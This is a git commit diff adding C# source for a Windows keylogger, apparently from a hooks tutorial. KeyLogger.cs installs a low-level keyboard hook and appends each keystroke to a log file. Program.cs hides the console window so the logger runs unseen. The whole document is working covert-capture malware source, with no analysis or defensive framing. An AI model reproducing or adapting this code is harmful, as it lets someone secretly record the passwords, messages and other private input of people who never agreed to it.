4ab0e9fe8fbf7a4c5c12b5eb42d8cdd933f9f918
Ross Guarino <rssguar@gmail.com>
2015-09-26 16:57:32 -0400

    Initial Commit

---
+++ HookKeylogger/KeyLogger.cs
@@ -0,0 +1,63 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace HooksTutorial
+{
+    class KeyLogger
+    {
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private HookProc callback = null;
+        private static IntPtr _hookID = IntPtr.Zero;
+        private static String log = "";
+
+        public KeyLogger(String logloc)
+        {
+            log = logloc;
+            callback = new HookProc(HookCallback);
+
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, this.callback,
+                    GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        public void Deactivate()
+        {
+            UnhookWindowsHookEx(_hookID);
+        }
+
+        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                Console.WriteLine((Keys)vkCode);
+                StreamWriter sw = new StreamWriter(log, true);
+                sw.Write((Keys)vkCode);
+                sw.Close();
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    }
+}
---
+++ HookKeylogger/Program.cs
@@ -0,0 +1,31 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace HooksTutorial
+{
+
+    class Program
+    {
+
+        static void Main(string[] args)
+        {
+            var handle = GetConsoleWindow();
+
+            var kl = new KeyLogger(Application.StartupPath + @"\log.txt");
+            // Hide
+            ShowWindow(handle, SW_HIDE);
+
+            Application.Run();
+            kl.Deactivate();
+        }
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+    }
+}
